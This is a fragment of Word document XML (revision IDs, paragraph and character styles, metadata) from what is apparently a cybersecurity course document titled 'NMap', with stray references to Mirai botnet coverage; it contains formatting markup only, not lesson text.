    <w:rsid w:val="00A835F3"/>
    <w:rsid w:val="00A846F4"/>
    <w:rsid w:val="00AA36A6"/>
    <w:rsid w:val="00AA3C2B"/>
    <w:rsid w:val="00AA4900"/>
    <w:rsid w:val="00AB0E31"/>
    <w:rsid w:val="00AB1876"/>
    <w:rsid w:val="00AB29E1"/>
    <w:rsid w:val="00AC234F"/>
    <w:rsid w:val="00AD0187"/>
    <w:rsid w:val="00AE1FD9"/>
    <w:rsid w:val="00AE628A"/>
    <w:rsid w:val="00AF6CDC"/>
    <w:rsid w:val="00B15D8D"/>
    <w:rsid w:val="00B32844"/>
    <w:rsid w:val="00B36727"/>
    <w:rsid w:val="00B36C32"/>
    <w:rsid w:val="00B41977"/>
    <w:rsid w:val="00B644C3"/>
    <w:rsid w:val="00B77ED4"/>
    <w:rsid w:val="00B83F83"/>
    <w:rsid w:val="00B8743A"/>
    <w:rsid w:val="00B8750E"/>
    <w:rsid w:val="00B87697"/>
    <w:rsid w:val="00B9463A"/>
    <w:rsid w:val="00BA142A"/>
    <w:rsid w:val="00BA307C"/>
    <w:rsid w:val="00BB44B9"/>
    <w:rsid w:val="00BB5048"/>
    <w:rsid w:val="00BE57D6"/>
    <w:rsid w:val="00BF18EC"/>
    <w:rsid w:val="00BF295D"/>
    <w:rsid w:val="00BF66EF"/>
    <w:rsid w:val="00C16706"/>
    <w:rsid w:val="00C246EF"/>
    <w:rsid w:val="00C2538D"/>
    <w:rsid w:val="00C3022D"/>
    <w:rsid w:val="00C33916"/>
    <w:rsid w:val="00C375C2"/>
    <w:rsid w:val="00C5527D"/>
    <w:rsid w:val="00C563B3"/>
    <w:rsid w:val="00C62E45"/>
    <w:rsid w:val="00C66A96"/>
    <w:rsid w:val="00C81652"/>
    <w:rsid w:val="00C9543B"/>
    <w:rsid w:val="00CA3B56"/>
    <w:rsid w:val="00CA65C1"/>
    <w:rsid w:val="00CB51E7"/>
    <w:rsid w:val="00CC6048"/>
    <w:rsid w:val="00CC6792"/>
    <w:rsid w:val="00CD27F9"/>
    <w:rsid w:val="00CD3DBD"/>
    <w:rsid w:val="00CE1905"/>
    <w:rsid w:val="00CE6CE6"/>
    <w:rsid w:val="00CE7FB2"/>
    <w:rsid w:val="00CF504F"/>
    <w:rsid w:val="00D1493D"/>
    <w:rsid w:val="00D30B12"/>
    <w:rsid w:val="00D61492"/>
    <w:rsid w:val="00D72357"/>
    <w:rsid w:val="00D86C97"/>
    <w:rsid w:val="00D92F8C"/>
    <w:rsid w:val="00D96371"/>
    <w:rsid w:val="00DA06AE"/>
    <w:rsid w:val="00DA3B36"/>
    <w:rsid w:val="00DC7C0F"/>
    <w:rsid w:val="00DD5807"/>
    <w:rsid w:val="00DE716A"/>
    <w:rsid w:val="00DE7BAD"/>
    <w:rsid w:val="00DF3B52"/>
    <w:rsid w:val="00DF5F09"/>
    <w:rsid w:val="00E01231"/>
    <w:rsid w:val="00E22EBB"/>
    <w:rsid w:val="00E244B1"/>
    <w:rsid w:val="00E33A1B"/>
    <w:rsid w:val="00E36597"/>
    <w:rsid w:val="00E36D0B"/>
    <w:rsid w:val="00E54F36"/>
    <w:rsid w:val="00E61680"/>
    <w:rsid w:val="00E61D94"/>
    <w:rsid w:val="00E6460B"/>
    <w:rsid w:val="00E75364"/>
    <w:rsid w:val="00E97E1C"/>
    <w:rsid w:val="00EC4BF8"/>
    <w:rsid w:val="00EE1688"/>
    <w:rsid w:val="00EF3F0E"/>
    <w:rsid w:val="00F053A0"/>
    <w:rsid w:val="00F138D2"/>
    <w:rsid w:val="00F1424D"/>
    <w:rsid w:val="00F144C1"/>
    <w:rsid w:val="00F14B0A"/>
    <w:rsid w:val="00F17165"/>
    <w:rsid w:val="00F2272A"/>
    <w:rsid w:val="00F26696"/>
    <w:rsid w:val="00F3050C"/>
    <w:rsid w:val="00F36239"/>
    <w:rsid w:val="00F3668A"/>
    <w:rsid w:val="00F37091"/>
    <w:rsid w:val="00F51D97"/>
    <w:rsid w:val="00F62012"/>
    <w:rsid w:val="00F65896"/>
    <w:rsid w:val="00F679F0"/>
    <w:rsid w:val="00F87EEA"/>
    <w:rsid w:val="00FA2B9E"/>
    <w:rsid w:val="00FA3073"/>
    <w:rsid w:val="00FA4AD4"/>
    <w:rsid w:val="00FA7668"/>
    <w:rsid w:val="00FD277E"/>
    <w:rsid w:val="00FE0EB7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F99B"/>
  <w15:docId w15:val="{778E3394-A8C3-4108-BC64-E2C5EAE2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FD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1064FD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064FD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1064FD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1064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64FD"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="001064FD"/>
    <w:pPr>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:rsid w:val="001064FD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731DAB"/>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:rsid w:val="001064FD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31DAB"/>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
      <w:sz w:val="1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A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1064FD"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:rsid w:val="001064F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FE0EB7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FE0EB7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E0EB7"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="NumberedHeading2">
    <w:name w:val="Numbered Heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="001064FD"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Outlinenumbering">
    <w:name w:val="Outline numbering"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="001064FD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1064F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18EC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17637"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Red">
    <w:name w:val="Red"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="00317637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1064FD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1064FD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1064FD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064FD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064FD"/>
    <w:pPr>
      <w:spacing w:after="100" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="403"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="59"/>
    <w:rsid w:val="00C3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D0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runch.com/2016/10/24/webcams-involved-in-dyn-ddos-attack-recalle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ddos/glossary/mirai-botnet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D5D3AD07FC4E568F12AA5A104B9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9587F-A24B-48AA-9567-62F648AA2F8A}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="006D00A1" w:rsidRDefault="00FB3561" w:rsidP="00FB3561">
          <w:pPr>
            <w:pStyle w:val="28D5D3AD07FC4E568F12AA5A104B9C5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11954347053461D90E7B4AF58646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0498B-C7AE-48CC-89E8-14C390A8CDA4}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="006D00A1" w:rsidRDefault="00FB3561" w:rsidP="00FB3561">
          <w:pPr>
            <w:pStyle w:val="C11954347053461D90E7B4AF58646AA4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13DFDCFC23124F9387FD73F9E7A7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3F2E-D3C2-49C3-A88C-2D1F94BAFC04}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00741844" w:rsidRDefault="00827A30" w:rsidP="00827A30">
          <w:pPr>
            <w:pStyle w:val="13DFDCFC23124F9387FD73F9E7A7BB2D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61"/>
    <w:rsid w:val="000578A5"/>
    <w:rsid w:val="00211340"/>
    <w:rsid w:val="00231802"/>
    <w:rsid w:val="00331145"/>
    <w:rsid w:val="00390FCD"/>
    <w:rsid w:val="006D00A1"/>
    <w:rsid w:val="00741844"/>
    <w:rsid w:val="00827A30"/>
    <w:rsid w:val="00A25A5D"/>
    <w:rsid w:val="00B83F83"/>
    <w:rsid w:val="00CE1905"/>
    <w:rsid w:val="00F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7A30"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="28D5D3AD07FC4E568F12AA5A104B9C5E">
    <w:name w:val="28D5D3AD07FC4E568F12AA5A104B9C5E"/>
    <w:rsid w:val="00FB3561"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="13DFDCFC23124F9387FD73F9E7A7BB2D">
    <w:name w:val="13DFDCFC23124F9387FD73F9E7A7BB2D"/>
    <w:rsid w:val="00827A30"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="C11954347053461D90E7B4AF58646AA4">
    <w:name w:val="C11954347053461D90E7B4AF58646AA4"/>
    <w:rsid w:val="00FB3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4A0E6-97C0-4C2C-A369-8976AD3C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352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NMap</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>Hewlett-Packard Company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NMap</dc:title>
  <dc:creator>BU-CYBR</dc:creator>
  <cp:lastModifiedBy>William Loring</cp:lastModifiedBy>
  <cp:revision>257</cp:revision>
  <cp:lastPrinted>2024-01-10T09:08:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-04-28T13:11:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-03T15:30:00Z</dcterms:modified>
</cp:coreProperties>
</file>